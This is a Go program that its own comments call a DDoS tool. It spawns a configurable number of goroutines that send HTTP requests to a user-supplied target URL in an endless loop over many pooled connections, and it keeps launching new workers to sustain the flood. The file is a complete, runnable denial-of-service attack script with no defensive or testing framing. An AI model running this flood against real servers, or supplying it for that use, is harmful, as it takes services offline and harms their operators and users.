package main

import (
	"flag"
	"fmt"
	"github.com/valyala/fasthttp"
	//	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/url"
	"runtime"
	"sync"
	"time"
)

const teskNum = 9
const maxConnsPerHost = 2048
const maxIdleConnDuration = time.Duration(1) * time.Second
const readTimeout = time.Duration(4) * time.Second
const writeTimeout = time.Duration(4) * time.Second
const dialTimeout = time.Duration(2) * time.Second

func testTask(id int, wg *sync.WaitGroup) {
	r := rand.Intn(10)
	defer wg.Done()
	log.Printf("Task start | %d | cost | %d", id, r)
	time.Sleep(time.Duration(r) * time.Second)
	log.Printf("Task finish ~~~| %d", id)
}

// DDoS - structure of value for DDoS attack
type DDoS struct {
	req          *fasthttp.Request
	clienTimeout time.Duration
	client       *fasthttp.Client
}

func newClient(URL string, Headers map[string]string, Timeout time.Duration) (*DDoS, error) {
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("Undefined host or error = %v", err)
	}
	req := fasthttp.AcquireRequest()
	req.SetRequestURI(URL)
	for k, v := range Headers {
		req.Header.Add(k, v)
	}
	client := &fasthttp.Client{
		MaxConnsPerHost:     maxConnsPerHost,
		MaxIdleConnDuration: maxIdleConnDuration,
		ReadTimeout:         readTimeout,
		WriteTimeout:        writeTimeout,
		Dial: func(addr string) (net.Conn, error) {
			return fasthttp.DialTimeout(addr, dialTimeout)
		},
	}
	return &DDoS{
		req:          req,
		clienTimeout: Timeout,
		client:       client,
	}, nil
}

func (d *DDoS) Do(index int, guard chan struct{}) error {
	defer func() {
		<-guard
		runtime.GC()
	}()

	// resp := fasthttp.AcquireResponse()
	for {
		err := d.client.DoTimeout(d.req, nil, d.clienTimeout)
		// https://tonybai.com/2015/10/30/error-handling-in-go/
		if err != nil {
			switch err {
			case fasthttp.ErrTimeout:
				// timeout
				log.Printf("index | %3d | client do timeout error | %s\n", index, err)
			case fasthttp.ErrDialTimeout:
				// dialing to the given TCP address timed out
				log.Printf("index | %3d | TCP dial timeout error  | %s\n", index, err)
			default:
				// no free connections available to host
				log.Printf("index | %3d | other error | %s\n", index, err)
			}
			return err
		}
		// resp.BodyWriteTo(ioutil.Discard)
	}
}

func main() {
	workers := flag.Int("w", 100, "worker num")
	targetUrl := flag.String("u", "http://127.0.0.1:80", "target url")
	timeOutCnt := flag.Int("to", 5, "fasthttp do timeout")
	flag.Parse()

	log.Println("start ~~~")
	log.Printf("worker  | %d\n", *workers)
	log.Printf("target  | %s", *targetUrl)
	log.Printf("timeout | %d Seconds\n", *timeOutCnt)

	cnt := 0
	guard := make(chan struct{}, *workers)

	headers := make(map[string]string)
	d, _ := newClient(*targetUrl, headers, time.Duration(*timeOutCnt)*time.Second)

	for {
		guard <- struct{}{} // would block if guard channel is already filled
		cnt += 1
		log.Println("new goroutinue | ", cnt)
		go d.Do(cnt, guard)
	}
	log.Printf("Finish\n")
}
